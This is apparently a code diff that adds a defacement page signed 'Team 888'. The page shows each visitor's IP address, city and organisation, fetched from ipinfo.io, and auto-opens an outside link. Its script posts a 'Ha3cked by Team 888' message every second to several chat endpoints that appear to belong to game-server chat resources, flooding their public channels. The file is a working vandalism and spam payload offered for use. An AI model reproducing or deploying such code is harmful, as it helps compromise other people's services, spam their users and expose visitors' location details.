@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AbOWaleed</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/a9/32/0a/a9320a9b3e62aecac4b4704ce0c8b06d.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff0000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 790px; 
+            height: auto;
+            border: 2px solid #ff0000; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #ff0000; 
+            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #ff0000; 
+            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="https://i.pinimg.com/originals/2f/d6/df/2fd6df147fcb28699d340a6cf34958a3.gif">
+    </div>
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1413126081942261852/1414624465265889320/SCq0eRiKDfGH.128.mp4?ex=68c03f32&is=68beedb2&hm=a19951d35721163dbb9ae31a2db2ccc7c9ea87203233a352a31eb199cc16682a&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text">AboWAleed On Top : Team 888</div>
+
+    <script>
+         fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
+        });
+            setTimeout(() => {
+                window.open("https://jumpshare.com/s/x1XUc2zg1TQ3ZL0eVkZD", "_blank");
+            }, 50);
+
+
+            const msg = `👑 Ha3cked by Team 888 On Top - . ! 👑`;
+            const body = JSON.stringify({ message: msg });
+            setInterval(() => {
+                fetch("https://flix-scripts/chatResult", { method: "POST", body });
+                fetch("https://danger_chat/Danger_Chat:SendMessage", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "message": msg,
+                        "channel": "شات العام",
+                        "color": null,
+                        "isImageAndLinksAllowed": [false, false]
+                    })
+                });
+                fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                    headers: {
+                        accept: "*/*",
+                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                    },
+                    body: JSON.stringify({ message: msg, channel: "شات العام" }),
+                    method: "POST"
+                });
+                fetch("https://melix_chat/chatResult", { method: "POST", body });
+                fetch("https://as_chat/chatResult", { method: "POST", body });
+                fetch("https://chat/chatResult", { method: "POST", body });
+                fetch("https://ho-chatv2/Chat", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "Type": "chatResult",
+                        "message": msg,
+                        "chatType": "general"
+                    })
+                });
+            }, 1000);
+        </script>
+
+    </div>
+
+</body>
+
+</html>
+------
